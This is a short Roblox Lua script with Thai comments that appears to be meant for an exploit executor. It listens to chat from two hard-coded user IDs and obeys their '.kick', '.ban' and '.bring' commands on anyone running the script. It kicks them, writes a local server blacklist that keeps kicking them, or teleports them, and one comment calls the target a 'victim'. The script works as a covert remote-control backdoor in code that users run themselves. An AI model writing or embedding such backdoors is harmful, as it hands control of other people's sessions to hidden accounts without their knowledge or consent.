local AdminList = { 
    8908656348, -- ใส่ ID แอดมิน
    290863568,
}

local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local Http = game:GetService("HttpService")
local BanFile = "3354_ServerBlacklist.json" 

-- ระบบเช็คแบน
if isfile and isfile(BanFile) then
    local s, r = pcall(function() return Http:JSONDecode(readfile(BanFile)) end)
    if s and r then
        for _, id in pairs(r) do if id == game.JobId then LP:Kick("Server Blacklisted") return end end
    end
end

local function addBan()
    local l = {}
    if isfile and isfile(BanFile) then pcall(function() l = Http:JSONDecode(readfile(BanFile)) end) end
    local f = false
    for _, id in pairs(l) do if id == game.JobId then f = true break end end
    if not f then
        table.insert(l, game.JobId)
        if writefile then writefile(BanFile, Http:JSONEncode(l)) end
    end
end

task.spawn(function()
    -- เช็คว่าเป็นแอดมินหรือไม่
    local function isAdmin(userId)
        for _, id in ipairs(AdminList) do if userId == id then return true end end
        return false
    end

    local function onChat(msg, speaker)
        -- รับคำสั่งจากแอดมินเท่านั้น
        if isAdmin(speaker.UserId) then
            local args = string.split(msg, " ")
            local cmd, target = args[1]:lower(), args[2]
            if not target then return end
            
            -- ฟังก์ชันเช็คชื่อเหยื่อ
            local function isMyName(t)
                if t == "$" or t == "all" then return true end
                return string.find(LP.Name:lower(), t:lower()) or string.find(LP.DisplayName:lower(), t:lower())
            end

            -- ถ้าชื่อเราตรงกับเป้าหมาย
            if isMyName(target) then
                
                -- [🔥 ส่วนสำคัญที่เพิ่มมา 🔥] ระบบ Whitelist / Immunity
                -- ถ้าตัวเราเป็นแอดมิน ให้ "ข้าม" ทันที (ไม่โดนเตะ/ไม่โดนดึง)
                if isAdmin(LP.UserId) then return end 

                if cmd == ".kick" then
                    LP:Kick("Kicked by Admin: " .. speaker.Name)
                elseif cmd == ".ban" then
                    addBan()
                    task.wait(0.1)
                    LP:Kick("Banned by Admin: " .. speaker.Name)
                elseif cmd == ".bring" then
                    if speaker.Character and LP.Character then
                        LP.Character.HumanoidRootPart.CFrame = speaker.Character.HumanoidRootPart.CFrame
                    end
                end
            end
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do p.Chatted:Connect(function(m) onChat(m, p) end) end
    Players.PlayerAdded:Connect(function(p) p.Chatted:Connect(function(m) onChat(m, p) end) end)
end)
